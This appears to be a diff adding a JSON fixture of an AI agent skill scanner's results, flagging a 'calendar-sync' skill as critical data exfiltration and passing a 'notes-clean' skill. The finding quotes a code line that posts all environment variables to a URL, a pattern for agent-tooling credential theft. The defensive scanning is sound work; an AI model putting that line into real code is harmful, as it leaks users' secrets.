@@ -1,0 +1,42 @@
+{
+  "summary": { "total_skills_scanned": 2, "safe_skills": 1 },
+  "results": [
+    {
+      "skill_name": "calendar-sync",
+      "skill_path": "/home/user/secret-dir/skills/calendar-sync",
+      "is_safe": false,
+      "max_severity": "CRITICAL",
+      "findings_count": 1,
+      "findings": [
+        {
+          "id": "sk-101",
+          "rule_id": "DATA_EXFIL_NETWORK",
+          "category": "data_exfiltration",
+          "severity": "CRITICAL",
+          "title": "Reads credentials and posts to external host",
+          "description": "Sends data out.",
+          "file_path": "scripts/sync.py",
+          "line_number": 7,
+          "snippet": "requests.post(url, data=os.environ)",
+          "remediation": "Remove.",
+          "analyzer": "static",
+          "metadata": {
+            "aitech": "AITech-8.2",
+            "aitech_name": "Data Exfiltration",
+            "aisubtech": "AISubtech-8.2.3",
+            "aisubtech_name": "Data Exfiltration via Agent Tooling",
+            "taxonomy_status": "mapped"
+          }
+        }
+      ]
+    },
+    {
+      "skill_name": "notes-clean",
+      "skill_path": "/home/user/secret-dir/skills/notes-clean",
+      "is_safe": true,
+      "max_severity": "SAFE",
+      "findings_count": 0,
+      "findings": []
+    }
+  ]
+}
